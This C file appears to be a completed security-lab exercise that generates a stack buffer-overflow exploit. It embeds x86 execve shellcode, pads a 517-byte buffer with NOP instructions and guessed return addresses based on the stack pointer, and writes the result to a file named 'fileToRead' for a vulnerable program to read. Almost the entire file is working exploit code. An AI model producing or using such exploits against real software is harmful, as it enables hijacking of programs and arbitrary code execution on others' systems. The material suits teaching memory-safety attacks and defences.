#include <string.h>
#include <stdio.h>
#include <stdlib.h>
//Proof and error to know the offsetChosen of the "jump"
#define CHOSEN_OFFSET 300

unsigned char code[] = /* TO DO-- binary code of the exploit previously created ---*/
"\x31\xc0"                /* xor    %eax,%eax */
"\x50"                   	/* push   %eax   */
"\x68\x6e\x2f\x6c\x73"    /* push   $0x736c2f6e  */
"\x68\x2f\x2f\x62\x69"    /* push   $0x69622f2f */
"\x89\xe3"              	/* mov    %esp,%ebx */
"\x50"                   	/* push   %eax */
"\x89\xe2"                /* mov    %esp,%edx */
"\x53"                   	/* push   %ebx */
"\x89\xe1"                /* mov    %esp,%ecx */
"\x51"                  	/* push   %ecx */
"\x52"                   	/* push   %edx */
"\xb0\x0b"               	/* mov    $0xb,%al */
"\xcd\x80"                /* int    $0x80 */
;


//The program locates itself. It gets ESP address
unsigned long jumpBegins(void){
     __asm__("movl %esp,%eax");
}

void main(int argc, char **argv){
	char buffer[517];
	FILE *attackfile;
	char *ptr;
	long *a_ptr;
	long address;
	int offsetChosen = CHOSEN_OFFSET;

	/* TO DO--Initialize buffer with 0x90 (NOP instruction) */

  memset(&buffer, 0x90, 517);

	//--------BEGIN FILL BUFFER

	address = jumpBegins()+offsetChosen;

	//Store the buffer value (beginning of the place where the vulnerable program input is stored)
	ptr = buffer;
	a_ptr = (long *) ptr;

	int i;
	// We copy the address that we think is of the shellcode
	for (i = 0; i < 300;i+=4){
		*(a_ptr++) = address;
	}

	/* TO DO--Copy the shellcode in the address that we assume is the right one
	The code is located almost at the end of the buffer*/

  for (i = 450; i < sizeof(code) + 450; i++)
      buffer[i] = code[i-450];


	//end of the string
	buffer[sizeof(buffer) - 1] = '\0';
	//--------END FILL BUFFER

	/* TO DO-- Save the contents to the file "fileToRead" which contains the attack*/
  attackfile = fopen("./fileToRead", "w");
  fwrite(buffer, 517, 1, attackfile);
  fclose(attackfile);
}
